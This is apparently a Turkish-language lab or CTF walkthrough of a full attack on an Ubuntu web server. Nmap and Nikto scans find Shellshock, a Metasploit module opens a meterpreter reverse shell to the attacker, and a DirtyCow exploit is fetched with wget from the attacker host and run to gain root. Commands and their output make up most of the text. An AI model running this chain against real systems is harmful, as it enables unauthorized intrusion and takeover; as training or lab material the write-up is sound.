@@ -1,0 +1,182 @@
+      ####Enumeration
+
+      ####Nmap
+Bir tarama çalıştırarak başlıyoruz :
+kali@kali:~$ sudo nmap $targetip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 08:17 EDT
+Nmap scan report for $targetip
+Host is up (0.032s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nikto
+nikto 80 numaralı bağlantı noktasında web sitesine karşı bir tarama yapmak çok ilginç bir şey gösteriyor:
+kali@kali:~$ nikto -h http://$targetip
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          $targetip
++ Target Hostname:    $targetip
++ Target Port:        80
++ Start Time:         2020-08-20 08:18:14 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.22 (Ubuntu)
++ Server may leak inodes via ETags, header found with file /, inode: 1706318, size: 177, mtime: Mon May 11 13:55:10 2020
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Uncommon header 'tcn' found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
++ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true
++ OSVDB-112004: /cgi-bin/test: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
++ Uncommon header '93e4r0-cve-2014-6271' found, with contents: true
++ OSVDB-112004: /cgi-bin/test.sh: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3092: /cgi-bin/test/test.cgi: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8725 requests: 0 error(s) and 14 item(s) reported on remote host
++ End Time:           2020-08-20 08:23:00 (GMT-4) (286 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+Bu kısım önemli:
++ OSVDB-112004: /cgi-bin/test.sh: Site appears vulnerable to the 'shellshock' vulnerability
+Raporlara göre, web sitesi kabuk shellshock'a karşı savunmasız.
+
+      ####Exploitation
+
+ShellShock
+Bu güvenlik açığından kolayca yararlanmak için multi/http/apache_mod_cgi_bash_env_exec  Metasploit modülünü kullanabiliriz:
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > options
+
+Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   CMD_MAX_LENGTH  2048             yes       CMD max line length
+   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
+   HEADER          User-Agent       yes       HTTP header to use
+   METHOD          GET              yes       HTTP method to use
+   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS          $targetip        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
+   RPORT           80               yes       The target port (TCP)
+   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT         8080             yes       The local port to listen on.
+   SSL             false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI       /cgi-bin/test    yes       Path to CGI script
+   TIMEOUT         5                yes       HTTP read response timeout (seconds)
+   URIPATH                          no        The URI to use for this exploit (default is random)
+   VHOST                            no        HTTP server virtual host
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  $attackerip      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
+
+[*] Started reverse TCP handler on $attackerip:4444 
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (980808 bytes) to $targetip
+[*] Meterpreter session 1 opened ($attackerip:4444 -> $targetip:49700) at 2020-08-20 08:05:46 -0400
+
+meterpreter > shell
+Process 1243 created.
+Channel 1 created.
+python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@ubuntu:/usr/lib/cgi-bin$ cd /tmp
+cd /tmp
+www-data@ubuntu:/tmp$
+
+      ####Privilege Escalation
+      ####Local Enumeration
+Hedef sistemi numaralandırmak için Linux Exploit Suggester betiğini indirip çalıştırıyoruz (https://github.com/mzet-/linux-exploit-sugester):
+kali@kali:~$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+$tagetip - - [20/Aug/2020 08:06:45] "GET /linux-exploit-suggester.sh HTTP/1.1" 200 -
+www-data@ubuntu:/tmp$ wget http://$attackerip/linux-exploit-suggester.sh
+wget http://$attackerip/linux-exploit-suggester.sh
+--2020-08-20 05:06:45--  http://$attackerip/linux-exploit-suggester.sh
+Connecting to $attackerip:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 83822 (82K) [text/x-sh]
+Saving to: `linux-exploit-suggester.sh'
+
+100%[======================================>] 83,822      --.-K/s   in 0.07s   
+
+2020-08-20 05:06:45 (1.09 MB/s) - `linux-exploit-suggester.sh' saved [83822/83822]
+
+www-data@ubuntu:/tmp$ chmod 777 linux-exploit-suggester.sh
+chmod 777 linux-exploit-suggester.sh
+www-data@ubuntu:/tmp$ ./linux-exploit-suggester.sh
+./linux-exploit-suggester.sh
+
+Available information:
+Kernel version: 3.2.0
+Architecture: x86_64
+Distribution: ubuntu
+Distribution version: 12.04
+...
+[+] [CVE-2016-5195] dirtycow
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Exposure: highly probable
+...
+Tarama, sistemin DirtyCow kök istismarına karşı savunmasız olduğunu gösteriyor. https://Gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54 C kaynak kod dosyasını içerir. Saldıran makinede derleyebiliriz:
+kali@kali:~$ gcc -pthread c0w.c -o c0w
+c0w.c: In function ‘main’:
+c0w.c:103:3: warning: implicit declaration of function ‘asprintf’; did you mean ‘vsprintf’? [-Wimplicit-function-declaration]
+  103 |   asprintf(&backup, "cp %s /tmp/bak", suid_binary);
+      |   ^~~~~~~~
+      |   vsprintf
+c0w.c:104:3: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
+  104 |   system(backup);
+      |   ^~~~~~
+
+Yapılması gereken tek şey, hedefte ayrıcalık yükseltme istismarını indirmek ve yürütmek:
+kali@kali:~$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+$targerip - - [20/Aug/2020 07:59:24] "GET /c0w HTTP/1.1" 200 -
+www-data@ubuntu:/tmp$ wget http://$attackerip/c0w
+wget http://$attackerip/c0w -O c0w
+--2020-08-20 05:08:05--  http://$attackerip/c0w
+Connecting to $attackerip:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 17904 (17K) [application/octet-stream]
+Saving to: `c0w'
+
+100%[======================================>] 17,904      --.-K/s   in 0.04s   
+
+2020-08-20 05:08:05 (461 KB/s) - `c0w' saved [17904/17904]
+
+www-data@ubuntu:/tmp$ chmod 777 c0w
+chmod 777 c0w
+www-data@ubuntu:/tmp$ ./c0w
+./c0w
+...
+Backing up /usr/bin/passwd to /tmp/bak
+mmap ef311000
+
+madvise 0
+
+ptrace 0
+
+www-data@ubuntu:/tmp$ 
+
+www-data@ubuntu:/tmp$ /usr/bin/passwd
+/usr/bin/passwd
+root@ubuntu:/tmp# whoami
+whoami
+root
